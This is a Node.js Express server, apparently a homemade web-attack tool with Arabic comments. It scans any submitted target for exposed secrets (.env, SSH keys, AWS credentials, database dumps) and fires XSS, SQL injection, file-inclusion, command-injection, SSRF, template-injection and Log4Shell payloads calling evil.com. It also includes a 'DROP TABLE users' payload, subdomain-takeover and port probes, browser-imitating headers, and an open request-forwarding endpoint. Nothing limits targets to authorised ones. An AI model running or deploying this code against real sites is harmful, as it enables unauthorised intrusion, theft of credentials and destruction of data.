const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 8443;

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TIMEOUT = 20000;

// 1. وظيفة لتحديد السرعة (Concurrency Limit) + User-Agent عشوائي
const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
];

function getRandomUA() { return userAgents[Math.floor(Math.random() * userAgents.length)]; }

async function safeFetch(url, opts = {}) {
  const ctrl = new AbortController();
  const timer = setTimeout(() => ctrl.abort(), TIMEOUT);
  const headers = opts.headers || {};
  
  headers['User-Agent'] = getRandomUA();
  headers['Accept'] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8";
  headers['Accept-Language'] = "en-US,en;q=0.5";
  headers['Connection'] = "keep-alive";
  headers['Upgrade-Insecure-Requests'] = "1";
  headers['Sec-Fetch-Dest'] = "document";
  headers['Sec-Fetch-Mode'] = "navigate";
  headers['Sec-Fetch-Site'] = "none";
  headers['Sec-Fetch-User'] = "?1";
  headers['Cache-Control'] = "max-age=0";
  
  try {
    return await fetch(url, { ...opts, headers, signal: ctrl.signal });
  } finally {
    clearTimeout(timer);
  }
}

async function pool(items, limit, fn) {
  const queue = [...items];
  await Promise.all(Array.from({ length: limit }, async () => {
    while (queue.length) {
      const item = queue.shift();
      if (item !== undefined) { try { await fn(item); } catch {} }
    }
  }));
}

// ============================================================
// قائمة الملفات الحساسة
// ============================================================
const sensitiveFiles = [
    ".env", ".env.local", ".env.prod", ".env.backup", ".env.dev", ".env.test",
    ".git/config", ".git/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".gitignore", ".gitattributes",
    "config.php", "config.xml", "config.json", "config.yaml", "config.ini", "config.php.bak", "config.php.old", "config.php~", "config.php.save", "config.php.orig",
    "web.config", "web.config.bak", "appsettings.json", "application.yml", "application.properties",
    "wp-config.php", "wp-config.php.bak", "wp-config.php.old", "wp-login.php", "xmlrpc.php",
    "backup.zip", "backup.tar.gz", "backup.sql", "backup.db", "backup.rar", "backup.7z", "backup.tar", "site.zip", "www.zip", "html.zip", "source.zip", "app.zip",
    "db.sql", "db.dump", "dump.sql", "database.sql", "database.db", "mysql.sql", "postgres.sql", "mssql.sql", "oracle.dmp", "sqlite.db", "sqlite3.db", "data.sqlite",
    "id_rsa", "id_dsa", "id_ecdsa", "id_ed25519", "authorized_keys", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/config",
    ".aws/credentials", ".aws/config", ".gcp/credentials.json", ".azure/credentials",
    "credentials.json", "credentials.xml", "secrets.json", "secrets.yml", "secrets.yaml", "secrets.env", "api_keys.json", "api_keys.txt", "keys.json", "keys.txt", "keys.pem", "keys.key",
    "private.key", "private.pem", "server.key", "server.pem", "server.crt", "cert.pem", "ca.pem", "keystore.jks", "truststore.jks",
    "phpinfo.php", "info.php", "test.php", "debug.php", "php.php", "server-status", "server-info", "nginx_status", "status", "health", "healthz", "metrics",
    "swagger.json", "swagger-ui.html", "swagger-ui/", "openapi.json", "api-docs", "v2/api-docs", "v3/api-docs", "graphiql", "graphql", "altair", "playground", "redoc",
    "admin/", "administrator/", "phpmyadmin/", "pma/", "adminer.php", "adminer/", "cpanel/", "whm/", "webmail/", "plesk/", "directadmin/",
    "manager/html", "manager/status", "host-manager/html", "jmx-console/", "web-console/", "admin-console/", "console/", "_console/",
    "composer.json", "composer.lock", "package.json", "package-lock.json", "yarn.lock", "pnpm-lock.yaml", "requirements.txt", "Pipfile", "Gemfile", "Gemfile.lock", "go.mod", "Cargo.toml",
    "Dockerfile", "Dockerfile.bak", "docker-compose.yml", "docker-compose.yaml", ".dockerenv", "kubernetes.yml", "k8s.yml", "helm/values.yaml",
    "Jenkinsfile", "Jenkinsfile.bak", ".gitlab-ci.yml", ".travis.yml", ".circleci/config.yml", ".github/workflows/", ".drone.yml", "azure-pipelines.yml", "buildspec.yml",
    "access.log", "error.log", "debug.log", "php_error.log", "logs/access.log", "logs/error.log", "var/log/apache2/access.log", "var/log/nginx/access.log", "storage/logs/laravel.log",
    "setup.php", "install.php", "readme.md", "README.md", "CHANGELOG.md", "LICENSE", "TODO.md", "old/", "backup/", "temp/", "tmp/", "private/", "logs/", "log/", "storage/",
    ".htaccess", ".htpasswd", ".user.ini", "php.ini", "php.ini.bak", "my.cnf", "my.ini", "pg_hba.conf", "postgresql.conf", "redis.conf", "mongod.conf", "elasticsearch.yml", "kibana.yml", "logstash.conf",
    "crossdomain.xml", "clientaccesspolicy.xml", "elmah.axd", "trace.axd", "glimpse.axd", "glimpse/", "elmah/", "trace/",
    "robots.txt", "sitemap.xml", "sitemap.xml.gz", "security.txt", ".well-known/security.txt", ".well-known/openid-configuration", ".well-known/assetlinks.json",
    "data.json", "data.xml", "data.csv", "data.yml", "data.yaml", "users.json", "users.xml", "users.csv", "users.sql", "passwords.txt", "passwords.json", "passwords.csv",
    "token.txt", "token.json", "tokens.csv", "auth.json", "auth.xml", "accounts.json", "accounts.xml", "admin.json", "admin.xml",
    "settings.py", "settings.py.bak", "app.py", "app.py.bak", "manage.py", "manage.py.bak",
    "actuator", "actuator/health", "actuator/env", "actuator/beans", "actuator/mappings", "actuator/configprops", "actuator/dump", "actuator/trace", "actuator/heapdump", "actuator/threaddump", "actuator/loggers", "actuator/metrics",
    "prometheus", "debug/vars", "debug/pprof", "debug/pprof/heap", "debug/pprof/goroutine", "debug/pprof/profile",
    "api/", "api/v1/", "api/v2/", "api/v3/", "rest/", "services/", "internal/", "private/", "secret/", "hidden/", "conf/", "config/", "settings/", "migration/", "dump/", "export/"
];

// ============================================================
// بايلودز
// ============================================================
const payloads = {
    xss: ["<script>alert(1)</script>", "\"><script>alert(1)</script>", "'><img src=x onerror=alert(1)>", "javascript:alert(1)", "<svg/onload=alert(1)>"],
    sqli: ["'", "\"", "' OR '1'='1", "1' OR '1'='1", "' UNION SELECT NULL--", "'; WAITFOR DELAY '0:0:5'--", "' AND SLEEP(5)--", "') OR ('1'='1"],
    lfi: ["../../../../etc/passwd", "....//....//....//etc/passwd", "/etc/passwd", "..\\..\\..\\..\\windows\\win.ini"],
    cmd: ["; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)"],
    ssrf: ["http://127.0.0.1:80", "http://169.254.169.254/latest/meta-data/", "http://localhost:8080"],
    ssti: ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
};

// ============================================================
// دوال الفحص
// ============================================================
async function scanVulnerabilities(url) {
    const out = [];
    try {
        const r = await safeFetch(url);
        const body = (await r.text()).toLowerCase();
        if (body.includes('sql syntax') || body.includes('mysql_') || body.includes('sqlstate')) out.push({ type: 'SQL Injection', severity: 'critical', description: 'Database Error Detected', url: url, evidence: 'SQL error', cvss: 9.8 });
        if (body.includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: 'Local File Inclusion', url: url, evidence: '/etc/passwd', cvss: 9.8 });
        if (body.includes('<!--')) out.push({ type: 'Info Disclosure', severity: 'low', description: 'HTML Comments Exposed', url: url, evidence: '<!--', cvss: 3.0 });
        if (body.includes('exception') || body.includes('stack trace')) out.push({ type: 'Info Disclosure', severity: 'medium', description: 'Stack Trace Exposed', url: url, evidence: 'Stack trace', cvss: 5.0 });
        
        const headers = r.headers;
        if (!headers.get('x-frame-options') && !headers.get('content-security-policy')) out.push({ type: 'Clickjacking', severity: 'medium', description: 'Missing X-Frame-Options & CSP', url: url, evidence: 'Headers', cvss: 5.4 });
        if (!headers.get('strict-transport-security')) out.push({ type: 'HSTS', severity: 'medium', description: 'Missing HSTS Header', url: url, evidence: 'Headers', cvss: 4.3 });
        if (headers.get('server')) out.push({ type: 'Server Info', severity: 'info', description: `Server exposed: ${headers.get('server')}`, url: url, evidence: 'Header', cvss: 3.1 });
        
        if (out.length === 0) out.push({ type: 'Connection', severity: 'info', description: 'No obvious vulnerabilities found.', url: url, evidence: null, cvss: 0.0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanSensitiveFiles(url) {
    const out = [];
    const base = new URL(url).origin;
    await pool(sensitiveFiles, 20, async (f) => {
        try {
            const r = await safeFetch(`${base}/${f}`, { redirect: 'manual' });
            if (r.status === 200) {
                const t = await r.text();
                if (t.length > 10) {
                    const sev = f.includes('.env') || f.includes('config') || f.includes('credentials') || f.includes('id_rsa') ? 'critical' : 'high';
                    out.push({ type: 'Sensitive File', severity: sev, description: `Exposed: ${f}`, url: `${base}/${f}`, evidence: '200 OK', cvss: sev === 'critical' ? 9.8 : 7.5 });
                }
            }
        } catch(e){}
    });
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No sensitive files found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanInjectionAndApi(url) {
    const out = [];
    const urlObj = new URL(url);
    const baseUrl = urlObj.origin;
    
    if (urlObj.search) {
        for (const [key, val] of urlObj.searchParams) {
            for (const p of payloads.xss) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes(p)) out.push({ type: 'XSS', severity: 'high', description: `Reflected XSS in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 7.5 }); } catch(e){}
            }
            for (const p of payloads.sqli) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = (await r.text()).toLowerCase(); if (b.includes('sql syntax') || b.includes('mysql_')) out.push({ type: 'SQL Injection', severity: 'critical', description: `SQLi in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
            for (const p of payloads.lfi) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); if ((await r.text()).includes('root:x:0:0')) out.push({ type: 'LFI', severity: 'critical', description: `Local File Inclusion in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
            for (const p of payloads.ssrf) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('meta-data') || b.includes('localhost')) out.push({ type: 'SSRF', severity: 'high', description: `SSRF in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 8.0 }); } catch(e){}
            }
            for (const p of payloads.ssti) {
                const testUrl = new URL(url); testUrl.searchParams.set(key, p);
                try { const r = await safeFetch(testUrl.toString()); const b = await r.text(); if (b.includes('49') && !b.includes('{{7*7}}')) out.push({ type: 'SSTI', severity: 'critical', description: `SSTI in: ${key}`, url: testUrl.toString(), evidence: p, cvss: 9.8 }); } catch(e){}
            }
        }
    }

    const apiPaths = new Set();
    try {
        const baseRes = await safeFetch(url);
        const html = await baseRes.text();
        const htmlPattern = /(?:href|src|action)=["']([^"']*(?:api|v[0-9]|rest|services)\/[^"']*)["']/gi;
        let match;
        while ((match = htmlPattern.exec(html)) !== null) { apiPaths.add(match[1]); }
        const jsPattern = /src=["']([^"']*\.js[^"']*)["']/gi;
        const jsFiles = new Set();
        while ((match = jsPattern.exec(html)) !== null) { jsFiles.add(match[1]); }
        for (const jsFile of jsFiles) {
            const jsUrl = new URL(jsFile, baseUrl);
            try {
                const jsRes = await safeFetch(jsUrl.toString());
                const jsContent = await jsRes.text();
                const apiMatch = /["'](\/api\/[^"']*|\/v[0-9]\/[^"']*|\/rest\/[^"']*)["']/gi;
                let jsMatch;
                while ((jsMatch = apiMatch.exec(jsContent)) !== null) { apiPaths.add(jsMatch[1]); }
            } catch(e){}
        }
    } catch(e){}

    if (apiPaths.size > 0) {
        for (const path of apiPaths) {
            const reversedPath = path.split('/').reverse().join('/');
            const testReversedUrl = new URL(reversedPath, baseUrl);
            try {
                const res = await safeFetch(testReversedUrl.toString());
                if (res.status === 200) out.push({ type: 'API Reversal', severity: 'high', description: `Reversed Path: ${reversedPath}`, url: testReversedUrl.toString(), evidence: 'Status 200', cvss: 8.0 });
            } catch(e){}
        }
    }

    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No parameters or API paths found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanDeepAnalysis(url) {
    const out = [];
    try {
        const r = await safeFetch(url);
        const body = await r.text();
        if (body.includes('<!--')) out.push({ type: 'Deep Analysis', severity: 'low', description: 'HTML Comments Found', url: url, evidence: '<!--', cvss: 3.0 });
        if (body.includes('/api/') || body.includes('ajax')) out.push({ type: 'Deep Analysis', severity: 'info', description: 'API Endpoints Detected', url: url, evidence: 'Pattern', cvss: 0 });
        if (body.toLowerCase().includes('password') || body.toLowerCase().includes('api_key')) out.push({ type: 'Deep Analysis', severity: 'high', description: 'Secret Keywords Found', url: url, evidence: 'Word match', cvss: 7.5 });
        if (out.length === 0) out.push({ type: 'Deep Analysis', severity: 'info', description: 'No comments or secrets found.', url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanDualVerification(url) {
    const out = [];
    try {
        const rGet = await safeFetch(url);
        let statusGet = rGet.status;
        let statusHead = 0;
        try { const rHead = await safeFetch(url, { method: 'HEAD' }); statusHead = rHead.status; } catch(e){}
        if (statusGet !== statusHead) out.push({ type: 'Dual Verification', severity: 'medium', description: `Inconsistency: GET (${statusGet}) != HEAD (${statusHead})`, url: url, evidence: 'Method check', cvss: 4.0 });
        else out.push({ type: 'Dual Verification', severity: 'info', description: `Consistent response (${statusGet})`, url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanPorts(url) {
    const out = [];
    const ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5432, 6379, 8080, 8443, 9200, 27017];
    const host = new URL(url).hostname;
    const protocol = new URL(url).protocol;
    await Promise.all(ports.map(async (port) => {
        try {
            const testUrl = `${protocol}//${host}:${port}`;
            const r = await safeFetch(testUrl, { timeout: 2000 });
            if (r.status < 500) out.push({ type: 'Open Port', severity: 'medium', description: `Port ${port} is open`, url: testUrl, evidence: `Status: ${r.status}`, cvss: 5.0 });
        } catch (e) {}
    }));
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No open ports found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanGitLeaks(url) {
    const out = [];
    const base = new URL(url).origin;
    const gitPaths = [".git/config", ".git/HEAD", ".git/index", ".git/logs/HEAD", ".git/refs/heads/master", ".git/refs/heads/main", ".git/description", ".git/packed-refs"];
    await pool(gitPaths, 5, async (path) => {
        try {
            const r = await safeFetch(`${base}/${path}`, { redirect: 'manual' });
            if (r.status === 200) {
                const t = await r.text();
                if (t.length > 10) out.push({ type: 'Git Leak', severity: 'critical', description: `Exposed: ${path}`, url: `${base}/${path}`, evidence: '200 OK', cvss: 9.8 });
            }
        } catch(e){}
    });
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No Git leaks found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanSubdomainTakeover(url) {
    const out = [];
    const hostname = new URL(url).hostname;
    const domainParts = hostname.split('.');
    const domain = domainParts.slice(-2).join('.');
    const subdomains = ["www", "mail", "ftp", "admin", "api", "dev", "test", "staging", "blog", "shop", "portal", "vpn", "webmail", "cpanel", "app", "m", "static", "cdn", "assets", "img", "files", "db", "sql", "backup", "old", "new", "beta", "demo", "stage", "prod", "support", "docs", "status", "logs", "git", "jenkins", "ci"];
    const fingerprints = { "github": "There isn't a GitHub Pages site here", "heroku": "No such app", "aws": "NoSuchBucket", "azure": "404 Web Site not found", "shopify": "Sorry, this shop is currently unavailable", "fastly": "Fastly error: unknown domain", "tumblr": "Whatever you were looking for doesn't currently exist", "wordpress": "Do you want to register", "ghost": "The thing you were looking for is no longer here" };
    await pool(subdomains, 10, async (sub) => {
        const targetUrl = `https://${sub}.${domain}`;
        try {
            const r = await safeFetch(targetUrl);
            if (r.status === 200) {
                const body = (await r.text()).toLowerCase();
                for (const [service, fingerprint] of Object.entries(fingerprints)) {
                    if (body.includes(fingerprint.toLowerCase())) out.push({ type: 'Subdomain Takeover', severity: 'critical', description: `Potential Takeover: ${service}`, url: targetUrl, evidence: fingerprint, cvss: 10.0 });
                }
            }
        } catch(e){}
    });
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No subdomain takeover detected.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanAdminPanels(url) {
    const out = [];
    const base = new URL(url).origin;
    const adminPaths = ["admin", "administrator", "login", "panel", "dashboard", "manage", "manager", "wp-admin", "wp-login.php", "cpanel", "webadmin", "adminarea", "adminpanel", "admin-console", "controlpanel", "moderator", "users", "sysadmin", "sys-admin", "admin_login", "adminlogin"];
    await pool(adminPaths, 10, async (path) => {
        try {
            const r = await safeFetch(`${base}/${path}`, { redirect: 'manual' });
            if (r.status === 200) {
                const t = (await r.text()).toLowerCase();
                if (t.includes('login') || t.includes('password') || t.includes('username') || t.includes('signin')) out.push({ type: 'Admin Panel', severity: 'medium', description: `Found Admin Panel: /${path}`, url: `${base}/${path}`, evidence: 'Login form', cvss: 5.3 });
            }
        } catch(e){}
    });
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No admin panels found.', url: url, evidence: null, cvss: 0 });
    return out;
}

async function scanDataLeaks(url) {
    const out = [];
    try {
        const r = await safeFetch(url);
        const body = await r.text();
        const emailRegex = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/g;
        const emails = body.match(emailRegex) || [];
        if (emails.length > 0) out.push({ type: 'Data Leak', severity: 'medium', description: `Found ${emails.length} emails in HTML`, url: url, evidence: emails[0], cvss: 5.0 });
        const apiKeyRegex = /(?:api[_-]?key|apikey|secret)["'\s:=]+([a-zA-Z0-9]{16,})/gi;
        const apiKeys = body.match(apiKeyRegex) || [];
        if (apiKeys.length > 0) out.push({ type: 'Data Leak', severity: 'high', description: `Found ${apiKeys.length} potential API keys`, url: url, evidence: apiKeys[0], cvss: 7.5 });
        if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No data leaks found.', url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanCORS(url) {
    const out = [];
    try {
        const r = await safeFetch(url, { headers: { 'Origin': 'https://evil.com' } });
        const allowOrigin = r.headers.get('access-control-allow-origin');
        const allowCreds = r.headers.get('access-control-allow-credentials');
        if (allowOrigin === '*' || allowOrigin === 'https://evil.com') out.push({ type: 'CORS Misconfig', severity: allowCreds === 'true' ? 'critical' : 'medium', description: `CORS allows: ${allowOrigin}`, url: url, evidence: `ACAO: ${allowOrigin}`, cvss: allowCreds === 'true' ? 9.0 : 5.0 });
        if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'CORS is secure.', url: url, evidence: null, cvss: 0 });
    } catch (e) {
        out.push({ type: 'Error', severity: 'high', description: 'Failed to connect', url: url, evidence: e.message, cvss: 0 });
    }
    return out;
}

async function scanRobotsAndSitemap(url) {
    const out = [];
    const base = new URL(url).origin;
    try {
        const r = await safeFetch(`${base}/robots.txt`);
        if (r.status === 200) {
            const txt = await r.text();
            if (txt.length > 10) out.push({ type: 'Robots.txt', severity: 'info', description: 'robots.txt is exposed', url: `${base}/robots.txt`, evidence: txt.slice(0, 100), cvss: 0 });
        }
    } catch(e){}
    try {
        const r = await safeFetch(`${base}/sitemap.xml`);
        if (r.status === 200) {
            const txt = await r.text();
            if (txt.length > 10) out.push({ type: 'Sitemap', severity: 'info', description: 'sitemap.xml is exposed', url: `${base}/sitemap.xml`, evidence: txt.slice(0, 100), cvss: 0 });
        }
    } catch(e){}
    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'No robots.txt or sitemap found.', url: url, evidence: null, cvss: 0 });
    return out;
}

// ============================================================
// ميزة جديدة: صنع الثغرات واختبارها فوراً (Fuzzer)
// ============================================================
async function scanGeneratePayloads(url) {
    const out = [];
    const urlObj = new URL(url);
    
    // 100+ بايلود حقيقي مصنوع للفحص
    const allPayloads = [
        ...payloads.xss, ...payloads.sqli, ...payloads.lfi, ...payloads.cmd, ...payloads.ssrf, ...payloads.ssti,
        "<!--#exec cmd=\"id\" -->", "%0d%0aSet-Cookie: hacked=1", "'; exec xp_cmdshell 'dir'--", 
        "WAITFOR DELAY '0:0:5'", "${jndi:ldap://evil.com/a}", "{{config.items()}}", 
        "../../../../etc/shadow", "<IMG SRC=\"javascript:alert('XSS');\">", "'; DROP TABLE users--"
    ];

    // لصق كل بايلود في كل بارامتر متاح في الموقع
    if (urlObj.search) {
        for (const [key, val] of urlObj.searchParams) {
            for (const payload of allPayloads) {
                const testUrl = new URL(url); 
                testUrl.searchParams.set(key, payload);
                
                try {
                    const start = Date.now();
                    const r = await safeFetch(testUrl.toString());
                    const body = (await r.text()).toLowerCase();
                    const elapsed = Date.now() - start;

                    // التحقق من نجاح الثغرة
                    if (body.includes(payload.toLowerCase()) || body.includes('sql syntax') || body.includes('root:x:0:0') || body.includes('uid=')) {
                        out.push({ type: 'Generated Vuln (Success)', severity: 'critical', description: `Payload worked on: ${key}`, url: testUrl.toString(), evidence: payload, cvss: 9.8 });
                    } else if (elapsed > 4500) {
                        out.push({ type: 'Generated Blind Vuln', severity: 'high', description: `Blind Time-Based Injection on: ${key}`, url: testUrl.toString(), evidence: payload, cvss: 8.0 });
                    } else {
                        out.push({ type: 'Generated Test (Failed)', severity: 'info', description: `Tried payload on: ${key}`, url: testUrl.toString(), evidence: payload, cvss: 0 });
                    }
                } catch(e){}
            }
        }
    } else {
        // إذا ما في بارامتر، نجرب نصنع ثغرة في مسارات الـ API
        const base = urlObj.origin;
        const testPaths = ["/api/v1", "/api/v2", "/admin", "/login"];
        for (const path of testPaths) {
            try {
                const r = await safeFetch(`${base}${path}`);
                if (r.status === 200) out.push({ type: 'Generated Endpoint', severity: 'medium', description: `Found active endpoint: ${path}`, url: `${base}${path}`, evidence: 'Status 200', cvss: 5.0 });
            } catch(e){}
        }
    }

    if (out.length === 0) out.push({ type: 'Info', severity: 'info', description: 'Could not generate or test payloads on this site.', url: url, evidence: null, cvss: 0 });
    return out;
}

function deduplicate(findings) {
    const seen = new Set();
    return findings.filter(f => {
        const key = `${f.type}|${f.url}|${f.description}`;
        if (seen.has(key)) return false;
        seen.add(key);
        return true;
    });
}

app.post('/api/scan', async (req, res) => {
    const { target, checks, intensity } = req.body;
    let url = target;
    if (!url.startsWith('http')) url = 'https://' + url;
    
    let findings = [];
    const type = checks[0];

    try {
        if (type === 'vulnerabilities') findings = await scanVulnerabilities(url);
        else if (type === 'sensitiveFiles') findings = await scanSensitiveFiles(url);
        else if (type === 'injectionAndApi') findings = await scanInjectionAndApi(url);
        else if (type === 'deepAnalysis') findings = await scanDeepAnalysis(url);
        else if (type === 'dualVerification') findings = await scanDualVerification(url);
        else if (type === 'ports') findings = await scanPorts(url);
        else if (type === 'gitLeaks') findings = await scanGitLeaks(url);
        else if (type === 'subdomainTakeover') findings = await scanSubdomainTakeover(url);
        else if (type === 'adminPanels') findings = await scanAdminPanels(url);
        else if (type === 'dataLeaks') findings = await scanDataLeaks(url);
        else if (type === 'cors') findings = await scanCORS(url);
        else if (type === 'robotsSitemap') findings = await scanRobotsAndSitemap(url);
        else if (type === 'generatePayloads') findings = await scanGeneratePayloads(url);
        else if (type === 'scanAll') {
            findings = await scanVulnerabilities(url);
            findings = findings.concat(await scanSensitiveFiles(url));
            findings = findings.concat(await scanInjectionAndApi(url));
            findings = findings.concat(await scanGitLeaks(url));
            findings = findings.concat(await scanSubdomainTakeover(url));
            findings = findings.concat(await scanAdminPanels(url));
            findings = findings.concat(await scanDataLeaks(url));
            findings = findings.concat(await scanCORS(url));
            findings = findings.concat(await scanRobotsAndSitemap(url));
            findings = findings.concat(await scanGeneratePayloads(url));
        }
        
        findings = deduplicate(findings);
    } catch (e) {
        findings.push({ type: 'Server Error', severity: 'high', description: e.message, url: url, evidence: null, cvss: 0 });
    }
    
    res.json({ target: url, timestamp: new Date().toISOString(), findings: findings });
});

app.post('/api/repeater', async (req, res) => {
    const { url, method, headers, body } = req.body;
    try {
        const r = await safeFetch(url, { method: method || 'GET', headers: headers, body: body });
        const responseBody = await r.text();
        const responseHeaders = {};
        r.headers.forEach((v, k) => { responseHeaders[k] = v; });
        res.json({ status: r.status, statusText: r.statusText, headers: responseHeaders, body: responseBody });
    } catch (e) {
        res.status(500).json({ error: e.message });
    }
});

app.get('/health', (req, res) => res.json({ ok: true }));
app.listen(PORT, '0.0.0.0', () => { console.log(`Server running on port ${PORT}`); });
